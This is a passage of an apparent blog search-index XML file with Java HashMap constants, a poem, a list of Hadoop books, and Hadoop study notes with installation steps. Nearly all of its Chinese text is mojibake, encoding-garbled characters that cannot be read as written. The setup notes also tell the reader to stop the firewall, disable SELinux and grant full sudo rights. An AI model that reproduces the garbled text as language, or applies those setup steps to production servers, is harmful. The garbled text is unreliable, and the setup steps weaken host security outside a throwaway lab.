*/static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;/** * æ‰©å®¹å› å­ï¼ˆè´Ÿè½½å› å­ï¼‰: 0.75 * æ‰©å®¹: æ¯æ¬¡2å€ */static final float DEFAULT_LOAD_FACTOR = 0.75f;/** * é“¾è¡¨: hashç®—æ³•å€¼ç›¸åŒçš„æ—¶å€™, ä¼šæŠŠå€¼ç›¸åŒçš„æ”¾åœ¨ä¸€ä¸ªé“¾è¡¨ä¸Š, é“¾è¡¨ä¸Šçš„å…ƒç´ ä¸ªæ•° * è¶…è¿‡8ä¸ªæ—¶, é“¾è¡¨è½¬åŒ–ä¸ºäºŒå‰æ ‘, æå‡æŸ¥è¯¢æ•ˆç‡ */static final int TREEIFY_THRESHOLD = 8;/** * å°äº6ä¸ªï¼Œ åˆå˜å›é“¾è¡¨ */static final int UNTREEIFY_THRESHOLD = 6;/** * The smallest table capacity for which bins may be treeified. * (Otherwise the table is resized if too many nodes in a bin.) * Should be at least 4 * TREEIFY_THRESHOLD to avoid conflicts * between resizing and treeification thresholds. */static final int MIN_TREEIFY_CAPACITY = 64;]]></content>
      <categories>
        <category>Java</category>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[â–æ— é¢˜]]></title>
    <url>%2F2018%2F06%2F02%2FPoetry%2F%E6%97%A0%E9%A2%98%2F</url>
    <content type="text"><![CDATA[åœ¨æ·®æµ·ä¸­è·¯çœ‹æ²¹ç”»ï¼Œè¦æŠŠå¤©ç©ºè°ƒå¼± è®©æ²¹èœèŠ±æš—ä¸‹å»ï¼Œçœ‹çœ‰å¼æ¸…ç§€ä¹‹äººç¦»å¼€èº«ä½“ ç©¿è¿‡è¡—å··ä¸­æ¶‚æŠ¹è¿‡çš„äººç¾¤ï¼Œæ‚„æ‚„æŠ•äº†æ°´ã€‚ åœ¨æ·®æµ·ä¸­è·¯1411å·ï¼Œæ˜¥å…‰é®è”½äº†æš—ç–¾ é¸Ÿé¸£å¸¦æ¥é€¼ä»„å’Œé£è¡Œæ„Ÿï¼Œä¸€ä¸ªäººçš„èº«ä½“åƒéº»ç»³ è£¸éœ²åœ¨æ–°é²œç©ºæ°”ä¸­ï¼Œéª¨å¤´å¼€è£‚å‡ºèŠ±æœµã€‚ çœ¼åº•çš„äº‘åˆç™½åˆé»‘ï¼Œè†ç›–çš„é’è‰²æ„ˆçˆ±æ„ˆæ·± ç©¿è¿‡æ­»åæ½­æ°´çš„å¯‚é™ï¼ŒèƒŒéƒ¨é•¿å‡ºçš„é±¼é³ ä¸€å¹´æ¯”ä¸€å¹´è–„ï¼Œæœˆäº®ä¸€æ—¥æ¯”ä¸€æ—¥æ—§ã€‚ ä¸æ˜¥é£äº¤æ¢èº«ä½“ï¼Œä¸ç´ ä¸ç›¸è¯†ä¹‹äººæŠ±å¤´ç—›å“­ ä¸æˆ‘ï¼Œè®¸ä¸‹å†æ­»ä¸€æ¬¡çš„è¯ºè¨€ï¼Œè¿™ä¹ˆå¤šå¹´äº† å¥¹è¯´ï¼Œæˆ‘çˆ±ä½ ä¾æ—§ï¼Œèƒœè¿‡ç”»ä¸­äººã€‚ ä½œè€… / éšå±…çš„äº‹]]></content>
      <categories>
        <category>æ–‡è‰º</category>
        <category>è¯—æ­Œ</category>
      </categories>
      <tags>
        <tag>è¯—æ­Œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoopç›¸å…³ä¹¦ç±]]></title>
    <url>%2F2018%2F06%2F02%2FHadoop%2F0-Hadoop%2FHadoop%E7%9B%B8%E5%85%B3%E4%B9%A6%E7%B1%8D%2F</url>
    <content type="text"><![CDATA[Hadoopæ¡†æ¶ä½“ç³»ç›¸å…³ä¹¦ç±æ¨è1. [Hadoopæƒå¨æŒ‡å—] ç¬¬å››ç‰ˆ é¡¾åæ€ä¹‰, å¾ˆæƒå¨ ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ 2. [HBaseæƒå¨æŒ‡å—] ç¥ä½ ğŸ´åˆ°æˆåŠŸ ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ğŸ´ 3. [Hiveç¼–ç¨‹æŒ‡å—] å°èœœèœ‚, å—¡å—¡å—¡. ğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸ ğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸğŸ 4. [zookeeperåˆ†å¸ƒå¼è¿‡ç¨‹ååŒæŠ€æœ¯è¯¦è§£] è¿™æ˜¯ä¸ªå•¥åŠ¨ç‰©?? ğŸ±?? ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ± ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±ğŸ±]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Books</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Books</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoopå­¦ä¹ ç¬”è®°-1 ç®€ä»‹&å®‰è£…]]></title>
    <url>%2F2018%2F05%2F31%2FHadoop%2F0-Hadoop%2FHadoop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E7%AE%80%E4%BB%8B%26%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[å¼•å…¥é¢è¯•é¢˜1. æœ‰ä¸€ä¸ªå¾ˆå¤§çš„(4T)çš„æ–‡ä»¶, æ–‡ä»¶ä¸­å­˜å‚¨çš„æ˜¯ip, æ¯è¡Œå­˜å‚¨ä¸€ä¸ª, è¦æ±‚æ±‚å‡ºå‡ºç°æ­¤å¤„æœ€å¤šçš„é‚£ä¸ªip1234567891011121314151617181920212223242526272829303132333435å¦‚æœè¿™ä¸ªæ–‡ä»¶æ˜¯å°æ–‡ä»¶ï¼š ioæµ+é›†åˆ å®ç°æ€è·¯ï¼š åˆ›å»ºä¸€ä¸ªæµè¿›è¡Œæ–‡ä»¶è¯»å– è¯»å–å‡ºæ¥çš„æ•°æ®å­˜å‚¨åˆ°mapé›†åˆä¸­ keyï¼šip value:æ¬¡æ•° ç»Ÿè®¡é€»è¾‘ï¼š åˆ¤æ–­è¯»å–çš„ipæ˜¯å¦å·²ç»å­˜åœ¨åœ¨mapä¸­ å­˜åœ¨ï¼šå–å‡ºvalue+1 ä¸å­˜åœ¨ï¼šå°†ipä½œä¸ºkey 1ä½œä¸ºvalue æ€ä¹ˆæ±‚ipå‡ºç°æ¬¡æ•°æœ€å¤šçš„ éå†map éå†keyï¼Œå–å‡ºvalueæ‰¾å‡ºæœ€å¤§å€¼ valueæœ€å¤§çš„keyå°±æ˜¯è¦æ‰¾çš„ipæˆ‘çš„æ–‡ä»¶è¶³å¤Ÿå¤§ï¼šå¤§åˆ°ä¸€å°æœºå™¨è£…ä¸ä¸‹ æ•°ç»„ é›†åˆ å˜é‡------&gt;åŸºäºå†…å­˜çš„ æ€ä¹ˆåŠï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ æœåŠ¡å™¨çš„2T 1.åœ¨æœ€æ—©çš„æ—¶å€™æˆ‘ä»¬çš„æ€ç»´æ¨¡å¼å°±æ˜¯çºµå‘æ‰©å±•ï¼Œå¢åŠ å•ä¸ªèŠ‚ç‚¹çš„æ€§èƒ½ 8T æ‘©å°”å®šå¾‹ï¼šç¡¬ä»¶æ€§èƒ½18-24ä¸ªæœˆä¼šæå‡ä¸€å€ 4T------2h 4T------1h å‰ææ˜¯æ•°æ®é‡ä¸å‘ç”Ÿæ”¹å˜ ä½†æ˜¯å¾€å¾€æ•°æ®é‡çš„å˜åŒ–é€Ÿåº¦è¿œè¿œå¤§äºæœåŠ¡å™¨æ€§èƒ½çš„æå‡é€Ÿåº¦ ç»è¿‡18ä¸ªæœˆ æœåŠ¡å™¨æ€§èƒ½æå‡äº†ä¸€å€ æ•°æ®é‡------æå‡äº†10å€ 4T------2h 40t-----20h ç›®å‰åªéœ€è¦10h çºµå‘æ‰©å±•ä¸å¯è¡Œï¼Ÿ æ¨ªå‘æ‰©å±•ï¼šå¦‚æœä¸€å°æœºå™¨å¤„ç†ä¸äº†æ•°æ® ä½¿ç”¨å¤šå°æœºå™¨ 4T------2h 4t----4ä¸ªæœºå™¨----0.5å°æ—¶ åˆ†è€Œæ²»ä¹‹çš„æ€æƒ³ï¼š ä¸€ä¸ªæœºå™¨è®¡ç®—æ€§èƒ½æœ‰é™ è¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨å¤šå°æœºå™¨å…±åŒè®¡ç®— æ¯å°æœºå™¨æ‰¿æ‹…ä¸€éƒ¨åˆ†è®¡ç®—é‡ æœ€ç»ˆå®ç°ï¼š 1.å…ˆå°†è¿™ä¸ªè¶³å¤Ÿå¤§çš„æ–‡ä»¶è¿›è¡Œåˆ‡åˆ† åˆ‡åˆ†æˆäº†å¤šä¸ªå°æ–‡ä»¶ 2.å°†å¤šä¸ªå°æ–‡ä»¶åˆ†å‘ç»™å¤šä¸ªæœºå™¨è¿›è¡Œç»Ÿè®¡æ¯ä¸ªipå‡ºç°çš„æ¬¡æ•° æ¯ä¸ªæ±‚å‡ºå‡ºç°æ¬¡æ•°æœ€å¤šçš„ip 3.åˆå¹¶æ±‚å‡ºæœ€ç»ˆçš„æœ€å¤§å€¼ 2. æœ‰ä¸¤ä¸ªå¾ˆå¤§çš„æ–‡ä»¶, ä¸¤ä¸ªæ–‡ä»¶ä¸­å­˜å‚¨çš„éƒ½æ˜¯url, æ±‚å‡ºä¸¤ä¸ªæ–‡ä»¶ä¸­ç›¸åŒçš„url12345678910111213141516171819202122å¦‚æœæ–‡ä»¶æ˜¯å°æ–‡ä»¶ï¼š ioæµ+é›†åˆï¼ˆsetï¼‰ å®ç°é€»è¾‘ï¼š 1.å…ˆåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶è¯»å–æµï¼Œç”¨æ¥è¯»å–ä¸¤ä¸ªæ–‡ä»¶ 2.åˆ›å»ºä¸¤ä¸ªé›†åˆset1 set2 3.è¿›è¡Œæ–‡ä»¶è¯»å–å¹¶åˆ†åˆ«set1 set2ä¸­ 4.å¾ªç¯éå†å…¶ä¸­ä¸€ä¸ªset1ï¼Œåˆ¤æ–­set1ä¸­å–å‡ºçš„æ¯ä¸ªurlæ˜¯å¦åœ¨set2ä¸­ set2.contains(url)å¤§æ–‡ä»¶çš„æ—¶å€™æ€ä¹ˆåŠï¼Ÿ æˆ‘ä»¬ä¹Ÿé‡‡ç”¨åˆ†è€Œæ²»ä¹‹çš„æ€æƒ³ï¼šå°†ä¸¤ä¸ªå¤§æ–‡ä»¶éƒ½è¿›è¡Œåˆ‡åˆ†ï¼Œæ¯ä¸ªå¤§æ–‡ä»¶éƒ½åˆ‡æˆå¤šä¸ªå°æ–‡ä»¶ ä¸€ä¸ªå¤§ä»»åŠ¡=4*4ä¸ªå°ä»»åŠ¡ è¿™æ ·è™½ç„¶å¯ä»¥è¾¾åˆ°ç›®çš„ä½†æ˜¯æ•ˆç‡å¤ªä½ï¼Ÿæ€ä¹ˆåŠï¼Ÿ æ’åºï¼Œåˆ‡åˆ†ï¼ˆè§„åˆ™åŒä¸€ï¼‰ æœ€ç»ˆå°†ä»»åŠ¡å‡å°‘åˆ°4ä¸ª ä½†æ˜¯å¤§æ–‡ä»¶æ’åºä»ç„¶æ˜¯ä¸€ä¸ªéå¸¸æ¶ˆè€—æ€§èƒ½çš„äº‹æƒ…ï¼Œå¦‚æœä¸éœ€è¦æ’åºå°±å¯åšåˆ°è¿™ä¸ªæ•ˆæœå°½é‡ä¸è¦æ’åº æ€ä¹ˆåŠï¼Ÿ hashç®—æ³•çš„ç›®çš„----ã€‹ç»™æ¯ä¸€ä¸ªå¯¹è±¡ç”Ÿæˆä¸€ä¸ªâ€œå”¯ä¸€â€çš„hashå€¼0-Integer_MAX æ˜¯å¦å¯ä»¥è¿ç”¨hashç®—æ³•è§£å†³è¿™ä¸ªé—®é¢˜ url.hashCode()%åˆ†æ®µçš„ä¸ªæ•° ä¸¤ä¸ªæ–‡ä»¶åˆ†æ®µè§„åˆ™ä¸€å®šç›¸åŒå—ï¼Ÿ url.hashCode()è‚¯å®šä¸€æ · åˆ†æ®µä¸ªæ•°ä¸€å®šç›¸åŒå—ï¼Ÿå¯ä»¥ä¸ä¸€æ · å¦‚æœä¸ä¸€æ ·çš„è¯ å¿…é¡»æˆå€æ•°å…³ç³» æœ€ç»ˆçš„è§£å†³æ–¹æ¡ˆï¼š åˆ†è€Œæ²»ä¹‹+åˆ†æ®µè§„åˆ™ åˆ†æ®µï¼šåˆ†åŒº 3. æœ‰ä¸€ä¸ªå¾ˆå°çš„æ–‡ä»¶, å­˜å‚¨çš„éƒ½æ˜¯url, æ¯è¡Œä¸€ä¸ª, æ€æ ·å¿«é€Ÿåˆ¤æ–­ç»™å®šçš„ä¸€ä¸ªurlæ˜¯å¦åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å°æ–‡ä»¶: IO + é›†åˆ(set) åˆ›å»ºio å’Œ é›†åˆ è¿›è¡Œæ–‡ä»¶è¯»å–æ”¾åœ¨ seté›†åˆä¸­ set.contains(url) ==&gt; true:å­˜åœ¨, false: ä¸å­˜åœ¨ å¤§æ–‡ä»¶: æ€è·¯1: ç”¨hashCode() è¿›è¡Œåˆ†åŒº, ç„¶åç”¨è¦æŸ¥æ‰¾çš„ url å–æ¨¡å®šä½ ä½†æ˜¯è¿™æ ·å®šä½åˆ°äº†è¿˜æ˜¯è¦ä¸€ä¸ªä¸ªæ‰¾ æ€è·¯2: æ•°ç»„çš„æŸ¥è¯¢æ€§èƒ½æ¯”è¾ƒé«˜, æ•°ç»„å¯ä»¥é€šè¿‡ä¸‹æ ‡ åŸºæ•°æ’åº æ•°ç»„çš„ç´¢å¼•ä»£è¡¨çš„æ˜¯æ•°æ®çš„åŸå§‹å€¼, æ•°ç»„ä¸­å­˜å‚¨çš„å€¼, æ˜¯åŸå§‹å€¼å‡ºç°çš„æ¬¡æ•° æ”¾åˆ°å¯¹åº”ä¸‹æ ‡çš„ä½ç½®, å€¼åªå­˜å‡ºç°çš„æ¬¡æ•° å¦‚æœæ•°ç»„ä¸­å¯¹åº”çš„ä¸‹è¡¨å­˜å‚¨çš„å€¼ä¸º0, ä»£è¡¨æ­¤ä¸‹æ ‡çš„å€¼æ²¡æœ‰å‡ºç°è¿‡, å°±ä¸éœ€è¦è¾“å‡º ç¼ºç‚¹: æ•°æ®èŒƒå›´è¿‡å¤§æ—¶, æ•°ç»„é•¿åº¦ä¸å¥½åˆ›å»º æ•°ç»„çš„ç±»å‹ä¸å¥½ç¡®å®š å¦‚æœæ•°æ®æ¯”è¾ƒåˆ†æ•£æ—¶, ä¼šé€ æˆèµ„æºæµªè´¹ ç»ƒä¹ : å†™ä¸€ä¸ªåŸºæ•°æ’åº, éšæœºç”Ÿæˆçš„20ä¸ªæ•°, è¿ç”¨åŸºæ•°æ’åºæ’åº å¯¹äºæœ¬é¢˜ ä¸éœ€è¦ç»Ÿè®¡æ¬¡æ•°, å­˜åœ¨æ ‡è®°ä¸º1, ä¸å­˜åœ¨å°±æ˜¯0 æ‰€ä»¥å­˜çš„æ—¶å€™æœ€å¥½ç”¨booleanå­˜, ç”¨ä½æ•°ç»„ bit[] å¯ä»¥è®¾è®¡å¤šä¸ªhashç®—æ³•, ç”¨æ¥æ ¡éªŒæŸä¸€ç§hashCodeç›¸åŒçš„æƒ…å†µ å½±å“è¯¯åˆ¤ç‡3è¦ç´ : hashç®—æ³•ä¸ªæ•° k - æ•°æ®é‡n - æ•°ç»„é•¿åº¦ m å¸ƒéš†è¿‡æ»¤å™¨ å…¬å¼: k = 0.7*(m/n), æ­¤æ—¶çš„è¯¯åˆ¤ç‡æœ€å° å¤§æ•°æ®åŸºæœ¬ä»‹ç»æ•°æ® æ•°æ®å°±æ˜¯æ•°å€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šè¿‡è§‚å¯Ÿã€å®éªŒæˆ–è®¡ç®—å¾—å‡ºçš„ç»“æœã€‚æ•°æ®æœ‰å¾ˆå¤šç§ï¼Œæœ€ç®€å•çš„å°±æ˜¯æ•°å­—ã€‚ æ•°æ®ä¹Ÿå¯ä»¥æ˜¯æ–‡å­—ã€å›¾åƒã€å£°éŸ³ç­‰ã€‚æ•°æ®å¯ä»¥ç”¨äºç§‘å­¦ç ”ç©¶ã€è®¾è®¡ã€æŸ¥è¯ç­‰ã€‚ ç»“æ„åˆ’åˆ†: ç»“æ„åŒ– åŠç»“æ„åŒ– éç»“æ„åŒ– å¤§æ•°æ®ç‰¹ç‚¹: 4V æ•°æ®é‡å¤§ 1 Byte =8 bit1 KB = 1,024 Bytes = 8192 bit1 MB = 1,024 KB = 1,048,576 Bytes1 GB = 1,024 MB = 1,048,576 KB1 TB = 1,024 GB = 1,048,576 MB ï¼ˆæ™®é€šç”¨æˆ·æ•°æ®çº§åˆ«ï¼‰1 PB = 1,024 TB = 1,048,576 GBï¼ˆä¼ä¸šçº§æ•°æ®çº§åˆ«ï¼‰1 EB = 1,024 PB = 1,048,576 TB1 ZB = 1,024 EB = 1,048,576 PBï¼ˆå…¨çƒæ•°æ®æ€»é‡çº§åˆ«ï¼‰ æ•°æ®å¢é•¿é€Ÿåº¦å¿« æ•°æ®ç§ç±»å¤š æ–‡å­— å›¾ç‰‡ éŸ³é¢‘ è§†é¢‘.. æ•°æ®çš„ä»·å€¼å¯†åº¦ä½ æ•´ä½“ä»·å€¼é«˜ æ•°æ®æ¥æº å…¬å¸ä¸­çš„è‡ªå·±çš„ä¸šåŠ¡æ•°æ® æ·˜å® äº¬ä¸œ ç¬¬ä¸‰æ–¹ çˆ¬è™« çˆ¬æ•°æ® æ•°æ®å¤„ç† ç¼ºå¤±æ•°æ®çš„å¤„ç† è€ƒè™‘ç¼ºå¤±æ•°æ®æ˜¯å¦å½±å“æ•´ä½“çš„ä¸šåŠ¡é€»è¾‘ ä¸å½±å“ åˆ é™¤ å¦‚æœæ˜¯å’Œé’±ç›¸å…³çš„æ•°æ® â€”-æ…é‡ ä¸èƒ½è½»æ˜“åˆ é™¤ æ•æ„Ÿæ•°æ® è„±æ•å¤„ç† â€“ åŠ å¯† æ•°æ®ä»·å€¼ äººç‰©ç”»åƒ æ ¹æ®æ ¹æ®ç”¨æˆ·æ•°æ®ç»™ç”¨æˆ·åšä¸€ä¸ªå…¨æ–¹ä½çš„åˆ†æç”»åƒ å±æ€§ï¼š äººè„‰ æ¶ˆè´¹æ°´å¹³ æ€§æ ¼ç‰¹ç‚¹ â€¦. å‡ ä¸ªæ¦‚å¿µé›†ç¾¤: å¤šä¸ªæœºå™¨å…±åŒåä½œå®ŒæˆåŒä¸€ä¸ªä»»åŠ¡, æ¯ä¸€ä¸ªæœºå™¨å«åšèŠ‚ç‚¹, å¤šä¸ªæœºå™¨å…±åŒç»„æˆçš„ç¾¤ä½“å«åšé›†ç¾¤ é›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ä¹‹é—´é€šè¿‡å±€åŸŸç½‘æˆ–å…¶ä»–æ–¹å¼é€šè®¯ åˆ†å¸ƒå¼: åˆ†è€Œæ²»ä¹‹ , ä¸€ä¸ªä»»åŠ¡å‘—åˆ†æˆå¤šä¸ªå­ä»»åŠ¡æ¨¡å—, æ¯ä¸ªä»»åŠ¡è·‘åœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Š åŸæ¥ä¸€ä¸ªäººå¹²çš„äº‹æƒ…, ç°åœ¨å¤§å®¶åˆ†å·¥åŠ³åŠ¨ åˆ†å¸ƒå¼çš„æ–‡ä»¶ç³»ç»Ÿ , åˆ†å¸ƒå¼æ•°æ®åº“, åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿ è´Ÿè½½å‡è¡¡: Nginx æ¯ä¸ªèŠ‚ç‚¹åˆ†é…åˆ°çš„ä»»åŠ¡åŸºæœ¬å‡è¡¡ è´Ÿè½½å‡è¡¡æ˜¯è·Ÿæ¯ä¸ªèŠ‚ç‚¹è‡ªèº«çš„é…ç½®ç­‰åŒ¹é…çš„ ä¸å­˜åœ¨ç»å¯¹çš„å‡è¡¡ Hadoopæ¦‚å¿µ ä¸€ä¸ªåˆ†å¸ƒå¼çš„å¼€æºæ¡†æ¶ æ”¯æŒæˆåƒä¸Šä¸‡çš„èŠ‚ç‚¹, æ¯ä¸ªèŠ‚ç‚¹ä¾é æœ¬åœ°çš„è®¡ç®—å’Œå­˜å‚¨ åœ¨åº”ç”¨å±‚é¢æä¾›é«˜å¯ç”¨æ€§ å°†ç¡¬ä»¶é”™è¯¯çœ‹æˆä¸€ä¸ªå¸¸æ€ Hadoopçš„æ¨¡å— Common æ”¯æŒå…¶ä»– Hadoop æ¨¡å—çš„å…¬å…±å®ç”¨ç¨‹åº å°è£…: å·¥å…·ç±», RPCæ¡†æ¶ HDFS Hadoopçš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ, è´Ÿè´£æµ·é‡æ•°æ®çš„å­˜å‚¨ å°†æ–‡ä»¶åˆ‡åˆ†æˆæŒ‡å®šå¤§å°çš„æ•°æ®å—å¹¶ä»¥å¤šå‰¯æœ¬çš„å­˜å‚¨å½¢å¼å­˜å‚¨åœ¨å¤šä¸ªæœºå™¨ä¸Š æ•°æ®åˆ‡åˆ†, å¤šå‰¯æœ¬, å®¹é”™ç­‰æ“ä½œå¯¹ç”¨æˆ·æ˜¯é€æ˜çš„ æ¶æ„: ä¸»ä»æ¶æ„ ( Javaè¿›ç¨‹) ä¸»: namenode ä¸€ä¸ª ä»: datenode å¤šä¸ª åŠ©ç†: SecondaryNamenode åˆ†æ‹…ä¸»è¿›ç¨‹çš„å‹åŠ› YARN é›†ç¾¤çš„èµ„æºè°ƒåº¦æ¡†æ¶, è´Ÿè´£é›†ç¾¤çš„èµ„æºç®¡ç† æ¶æ„: ä¸»ä»æ¶æ„ ä¸»: ResourceManager â€“ è´Ÿè´£ç»Ÿç­¹èµ„æº ä»: NodeManager MapReduce åˆ†å¸ƒå¼è®¡ç®—æ¡†æ¶, æœ‰è®¡ç®—ä»»åŠ¡çš„æ—¶å€™æ‰ä¼šæœ‰å“åº”çš„è¿›ç¨‹ Hadoopçš„æ­å»ºæ­å»ºå‰çš„å‡†å¤‡123456789101112131415161718192021222324252627282930313233343536373839404142æ­å»ºå‡†å¤‡ï¼š1ï¼‰ipé…ç½®2ï¼‰ä¸»æœºå vi /etc/sysconfig/network3ï¼‰ä¸»æœºæ˜ å°„4ï¼‰å…³é—­é˜²ç«å¢™å’Œsellinux service iptables stop vi /etc/selinux/config SELINUX=disabled5ï¼‰å°†ç³»ç»Ÿçš„å¯åŠ¨çº§åˆ«æ”¹ä¸º3 vi /etc/inittab6ï¼‰åˆ›å»ºæ™®é€šç”¨æˆ·ï¼Œå¹¶ä¸ºæ™®é€šç”¨æˆ·æ·»åŠ sudolersæƒé™ åˆ›å»ºç”¨æˆ·ï¼šuseradd ç”¨æˆ·å passwd ç”¨æˆ·å vi /etc/sudoers hadoop ALL=(ALL) ALL7ï¼‰é…ç½®å…å¯†ç™»å½• å…ˆåˆ‡æ¢åˆ°æ™®é€šç”¨æˆ· 1ï¼‰ç”Ÿæˆç§˜é’¥ ssh-keygen 2)å‘é€ç§˜é’¥ ssh-copy-id hadoop(ä¸»æœºå) éªŒè¯ï¼šssh hadoop 8ï¼‰å®‰è£…jdk å¸è½½jdkï¼š rpm -qa|grep jdk rpm -e java-1.7.0-openjdk-1.7.0.99-2.6.5.1.el6.x86_64 --nodeps9ï¼‰æ—¶é—´åŒæ­¥ ä¼ªåˆ†å¸ƒå¼ä¸éœ€è¦ åˆ†å¸ƒå¼éœ€è¦ï¼Œå¿…é¡»åš10)é€‰æ‹©å®‰è£…ç‰ˆæœ¬ï¼š ä¸é€‰å¤ªé™ˆæ—§çš„ç‰ˆæœ¬ä¹Ÿä¸é€‰æœ€æ–°çš„ç‰ˆæœ¬ 2.7.6 11)å®‰è£… ä¸€å®šåˆ‡æ¢ç”¨æˆ· æ™®é€šç”¨æˆ· æ–¹å¼1: ä¼ªåˆ†å¸ƒå¼æ‰€æœ‰è¿›ç¨‹å…¨éƒ¨è¿è¡Œåœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162631ï¼‰ä¸Šä¼ 2ï¼‰è§£å‹3ï¼‰ä¿®æ”¹é…ç½®æ–‡ä»¶ é…ç½®æ–‡ä»¶çš„ç›®å½•ï¼šHADOOP_HOME/etc/hadoop éœ€è¦ä¿®æ”¹6ä¸ªé…ç½®æ–‡ä»¶ï¼š 1ï¼‰hadoop-env.sh export JAVA_HOME=/home/hadoop/jdk1.8.0_73/ 2)core-site.xml æ ¸å¿ƒé…ç½®æ–‡ä»¶ &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://hadoop:9000&lt;/value&gt; &lt;/property&gt; 3)hdfs-site.xml &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt; 4)yarn-site.xml &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; 5)mapred-site.xml &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; 6)slaves é…ç½®çš„æ˜¯ä»èŠ‚ç‚¹çš„ä¿¡æ¯ 7)é…ç½®ç¯å¢ƒå˜é‡ export JAVA_HOME=/home/hadoop/jdk1.8.0_73 export HADOOP_HOME=/home/hadoop/hadoop-2.7.6 export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin:$HADOOP_HOME/sbin source /etc/rpofile éªŒè¯ hadoop version 8)å…ˆè¿›è¡Œæ ¼å¼åŒ– hadoop namenode -format 9)å¯åŠ¨ start-all.sh ä¸å»ºè®® å»ºè®®ä»¥ä¸‹å‘½ä»¤ï¼š start-dfs.sh start-yarn.sh 10ï¼‰éªŒè¯ jps 6ä¸ªè¿›ç¨‹ 3909 Jps 3736 